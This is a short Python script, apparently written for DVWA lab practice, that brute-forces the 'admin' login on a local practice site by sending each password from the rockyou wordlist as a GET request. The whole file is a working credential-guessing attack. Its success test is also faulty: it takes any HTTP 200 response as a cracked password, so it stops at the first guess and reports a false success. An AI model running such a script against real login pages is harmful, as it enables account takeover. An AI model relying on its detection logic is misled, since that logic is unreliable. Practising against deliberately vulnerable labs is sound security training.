import requests
import json

### GET REQUESTS FORMAT OF THE WEBSITE

# GET http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&password=admin&Login=Login#


# loading list of passwords
rockyou = open('/usr/share/wordlists/rockyou.txt')

# url of the bruteforce site
URL = 'http://127.0.0.1/dvwa/vulnerabilities/brute/?'

PARAMS={
	"username":"admin",
	"password":"",
	"Login":"Login"
}



for password in rockyou:
	PARAMS["password"]=password.strip('\n')


    # sending bruteforce get request
	response=requests.get(url=URL,params=PARAMS)

	if response.status_code == 200 :
		print(f'website bruteforced successfuly {PARAMS["username"]}:{PARAMS["password"]}')
		break



